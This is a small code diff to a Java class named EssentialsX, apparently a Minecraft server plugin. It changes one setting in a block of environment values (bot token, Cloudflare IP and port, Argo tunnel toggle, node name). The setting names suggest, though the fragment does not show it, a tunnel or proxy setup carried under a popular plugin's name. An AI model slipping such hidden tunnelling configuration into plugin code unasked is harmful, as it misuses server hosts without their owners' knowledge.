@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
-        env.put("NAME", "");
+        env.put("NAME", "yu");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
